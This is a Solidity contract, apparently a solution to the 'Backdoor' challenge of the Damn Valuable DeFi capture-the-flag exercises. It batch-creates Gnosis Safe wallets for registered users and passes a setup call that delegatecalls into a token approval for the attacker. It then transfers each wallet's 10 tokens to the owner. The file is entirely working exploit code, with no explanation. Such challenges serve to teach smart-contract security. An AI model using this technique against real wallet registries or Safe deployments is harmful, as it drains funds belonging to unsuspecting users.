// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttacker {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    function setupToken(address _tokenAddress, address _attacker) external {
        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
    }

    function attack(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            bytes memory initGnosis = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                victim,
                uint256(1),
                address(this),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    0,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(proxy),
                owner,
                10 ether
            );
        }
    }
}
